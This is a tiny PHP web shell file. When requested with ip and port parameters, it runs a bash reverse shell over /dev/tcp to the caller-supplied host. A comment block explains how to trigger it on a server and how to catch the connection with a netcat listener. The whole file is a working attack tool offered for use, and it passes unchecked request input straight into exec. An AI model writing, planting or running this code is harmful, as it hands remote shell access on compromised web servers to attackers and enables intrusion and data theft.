<?php

// author: https://gist.github.com/Spotrealms/f33bf324b3d34287676d7d1b87bf169d

if (isset ($_REQUEST["shell"])){$ip = $_REQUEST["ip"];$port = $_REQUEST["port"];exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");}
?>

<!--
USAGE (reverse shell/server): url-to-file.php?shell&ip=<attacker ip>&port=<attacker port>
 USAGE (reverse shell/client): (in netcat) nc -v -l -p <attacker port>
 NOTE (reverse shell): The ip (lan if on the same network, wan if it's a remote server) and port of the attacker and target must be the same or else no connection will be established.
-->
